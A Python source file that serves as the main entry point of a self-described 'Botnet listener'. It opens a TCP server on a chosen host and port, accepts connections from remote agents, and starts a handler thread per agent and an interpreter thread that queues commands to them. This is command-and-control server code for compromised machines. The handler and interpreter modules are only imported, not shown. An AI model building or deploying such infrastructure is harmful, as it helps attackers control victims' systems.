#!/usr/bin/python3

# Main imports
import socket
import sys
import os
import signal
import threading
import queue
import time

# Project imports
from handler import Handler
from interpreter import Interpreter
# from interpreter import Interpreter
# from handler import Handler

agentList = []      # Stores client_address[] info (IP, Port): IP is stored in string format, port is not
                    # [Handler-ID]-[client_address]-[ IP ]
                    #            |                L-[Port]
                    #            L-[CMD_Queue]

def listener(lhost, lport):

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (lhost, lport)
    server.bind(server_address)
    server.listen(100)

    print(f"[* Listener] Starting Botnet listener on tcp://{lhost}:{str(lport)}\n")

    InterpreterThread = Interpreter(agentList)          # Handles interface, queue is for commands
    InterpreterThread.start()

    connRecord = 0                                         # Records Connection ID

    while True:

        (client, client_address) = server.accept()  # start listening
        print(f"\n[* Listener-Msg] Connection received from {str(client_address[0])}\n")

        # BotHandler = Multiconn, a new BotHandler is spawned for each incoming connection
        newConn = Handler(client, client_address, connRecord)
        newConn.start()

        agentList.append(newConn)
        print(agentList)
        connRecord += 1

# -------------------------------------------------------------------------------------------

#import
def main():

    # batchList = []              # List for systems that are being interacted with in BatchMode
    # allConnections = []        # Stores all BotHandler instances
    # aliveConnections = []       # Stores all currently alive BotHandler sessions
    # deadConnections = []        # Records the dead-instance's information
                                # This may be an odd thing to implement. 
                                # Do we simply want to store the IP address + Port + ID?

    if (len(sys.argv) < 3):
        print(f"[* Interpreter-Msg] Usage:\n  [+] python3 {sys.argv[0]} <LHOST> <LPORT>\n  [+] Eg.: python3 {sys.argv[0]} 0.0.0.0 1337\n")
    else:
        try:
            lhost=sys.argv[1]
            lport=int(sys.argv[2])
            listener(lhost, lport)
        except Exception as ex:
            print(f"[* Interpreter-Msg] Unable to establish the Handler. Error: {str(ex)}\n")

if __name__ == '__main__':
    main()
